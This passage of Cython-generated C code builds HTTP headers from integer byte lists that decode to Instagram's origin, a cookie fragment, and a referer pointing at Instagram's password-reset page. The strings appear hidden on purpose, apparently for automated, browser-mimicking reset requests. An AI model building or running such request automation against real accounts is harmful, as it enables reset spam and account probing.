  PyList_SET_ITEM(__pyx_t_3, 139, __pyx_int_86);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_3, 140, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_65);
  __Pyx_GIVEREF(__pyx_int_65);
  PyList_SET_ITEM(__pyx_t_3, 141, __pyx_int_65);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_3, 142, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_59);
  __Pyx_GIVEREF(__pyx_int_59);
  PyList_SET_ITEM(__pyx_t_3, 143, __pyx_int_59);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 144, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 145, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_3, 146, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_3, 147, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 148, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 149, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 150, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_3, 151, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_3, 152, __pyx_int_61);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 153, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_59);
  __Pyx_GIVEREF(__pyx_int_59);
  PyList_SET_ITEM(__pyx_t_3, 154, __pyx_int_59);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 155, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_3, 156, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 157, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 158, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_3, 159, __pyx_int_61);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_3, 160, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 161, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_3, 162, __pyx_int_55);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_3, 163, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_59);
  __Pyx_GIVEREF(__pyx_int_59);
  PyList_SET_ITEM(__pyx_t_3, 164, __pyx_int_59);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 165, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 166, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_3, 167, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_3, 168, __pyx_int_61);
  __Pyx_INCREF(__pyx_int_51);
  __Pyx_GIVEREF(__pyx_int_51);
  PyList_SET_ITEM(__pyx_t_3, 169, __pyx_int_51);
  __Pyx_INCREF(__pyx_int_57);
  __Pyx_GIVEREF(__pyx_int_57);
  PyList_SET_ITEM(__pyx_t_3, 170, __pyx_int_57);
  __Pyx_INCREF(__pyx_int_51);
  __Pyx_GIVEREF(__pyx_int_51);
  PyList_SET_ITEM(__pyx_t_3, 171, __pyx_int_51);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_3, 172, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_52);
  __Pyx_GIVEREF(__pyx_int_52);
  PyList_SET_ITEM(__pyx_t_3, 173, __pyx_int_52);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_3, 174, __pyx_int_54);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_3, 175, __pyx_int_54);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_110);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(25); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_58);
  __Pyx_GIVEREF(__pyx_int_58);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_58);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 16, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_2, 17, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 18, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 19, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 20, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 21, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 22, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 23, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 24, __pyx_int_109);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_114);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(63); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_58);
  __Pyx_GIVEREF(__pyx_int_58);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_58);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 16, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_3, 17, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 18, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 19, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 20, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 21, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 22, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 23, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 24, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 25, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 26, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 27, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 28, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 29, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_3, 30, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 31, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 32, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 33, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 34, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 35, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 36, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 37, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 38, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 39, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 40, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 41, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_3, 42, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 43, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 44, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 45, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 46, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 47, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 48, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 49, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_63);
  __Pyx_GIVEREF(__pyx_int_63);
  PyList_SET_ITEM(__pyx_t_3, 50, __pyx_int_63);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 51, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 52, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_3, 53, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 54, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 55, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 56, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_3, 57, __pyx_int_61);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_3, 58, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_3, 59, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 60, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 61, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_3, 62, __pyx_int_108);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(9); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_97);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(40); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_34);
  __Pyx_GIVEREF(__pyx_int_34);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_34);
  __Pyx_INCREF(__pyx_int_78);
  __Pyx_GIVEREF(__pyx_int_78);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_78);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_116);
